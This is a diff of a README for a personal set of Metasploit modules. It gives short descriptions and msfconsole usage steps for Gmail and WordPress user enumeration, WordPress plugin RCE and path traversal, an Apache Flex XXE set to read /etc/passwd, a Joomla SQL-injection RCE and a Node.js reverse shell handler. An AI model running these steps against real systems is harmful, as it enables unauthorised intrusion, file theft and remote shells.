@@ -1,22 +1,74 @@
-### My exploits and auxiliarys code for metasploit.<br>
+# Modules MSF. 
 
-*msfconsole<br>* 
-[ * ]reload_all<br>
+Some modules that I created for fun. =]
 
-### use auxilary/gather/gmail_checker or wordpress_enumerating_username
-Gmail_checker - You can used for enumerate users emails by gmail.<br>
+##### gmail_checker.rb
+Enumerate user of gmail. 
 
-## gmail_checker.rb -> auxiliary/gather/gmail_checker <br>
+````
+msf> use auxiliary/gather/gmail_checker
+msf> set check_email email_target@gmail.com
+msf> run
+. 
+. 
+.
+````
+##### Wordpress Enumeration Users 
+Enumerate adminnistrations users. 
+
+````
+msf> use auxiliary/gather/wordpress_enumerating_username
+msf> set rhost <target>
+msf> exploit 
+.
+.
+.
+````
+
+##### wp_drive_rce
+RCE in Google Drive plugin for wordpress .
+
+##### wp_with_pritz
+Path Transversal WP with Spritz for wordpress .
+
+##### apacheflex_xxe
+XXE Injection in Apache Flex 
+
+````
+msf> use auxiliary/http/apacheflex_xxe
+msf> set rhost <target>
+msf> set rport <target>
+msf> set file  </etc/passwd>
+msf> exploit 
+.
+.
+.
+`````
 
 
-### Wordpress_enumerating [CVE-2017-5487]
-List admin of wordpress. 
-## wordpress_enumerating_username.rb -> auxiliary/gather/wordpress_enumerating_username
+##### joomla_comfields_sqli_rce
+SQL Injection in Joomla 
 
-### wp_drive_rce.rb
-Reinstall wordpress. This is vulnerability in WP Plugin: google drive. <br>
-Path: auxiliar/admin/http
+`````
+msf> use exploits/unix/webapp>joomla_comfields_sqli_rce
+msf> set rhost <target>
+msf> set rport <target>
+msf> exploit 
+.
+.
+.
+`````
 
-### wp_with
-Vulnerability in wp_with plugin. Path Transversal
-Path: auxliary/admin/http
+
+##### nodejs_reverseshell
+Reverse TCP using Node JS
+
+`````
+msf> use exploits/multi/handler
+msf> set payload cmd/unix/reverse_nodejs
+msf> set rhost <ip>
+msf> set rport <port>
+msf> exploit
+
+`````
+
